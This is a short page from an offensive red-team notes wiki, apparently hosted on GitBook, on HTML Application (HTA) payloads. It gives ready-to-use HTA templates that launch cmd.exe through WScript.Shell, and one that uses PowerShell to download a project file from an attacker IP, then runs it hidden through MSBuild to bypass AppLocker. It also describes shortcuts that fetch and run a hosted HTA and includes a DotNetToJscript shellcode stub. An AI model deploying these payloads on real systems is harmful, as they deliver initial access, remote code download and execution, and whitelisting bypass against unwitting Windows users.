---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/red-team/execution/hta
---

# HTA

## Simple code template:

```html
<html>
<body>
<script>
	var c= 'cmd.exe'
	new ActiveXObject('WScript.Shell').Run(c);
</script>
</body>
</html>
```

<figure><img src="../../../.gitbook/assets/image (214).png" alt=""><figcaption></figcaption></figure>

This will be beneficial for bypassing **AppLocker**

```html
<html>
<body>
<script>
	var c= "powershell iwr http://192.168.19.134/pwsh.csproj -OutFile C:\\Windows\\Tasks\\pwsh.csproj;powershell -w hidden C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe /nologo /noconsolelogger C:\\Windows\\Tasks\\pwsh.csproj";
	new ActiveXObject('WScript.Shell').Run(c);window.close();
</script>
</body>
</html>
```

<figure><img src="../../../.gitbook/assets/image (217).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (218).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (216).png" alt=""><figcaption></figcaption></figure>

## Shortcut

Create a shortcut that downloads and executes a hosting hta file when user clicked.

<figure><img src="../../../.gitbook/assets/image (895).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (896).png" alt=""><figcaption></figcaption></figure>

## DotNetToJscript with HTA

```javascript
<html> 
<head> 
<script language="JScript">
DotNetToJscript - SHELLCODE
</script>
</head> 
<body>
<script language="JScript">
self.close();
</script>
</body> 
</html>
```
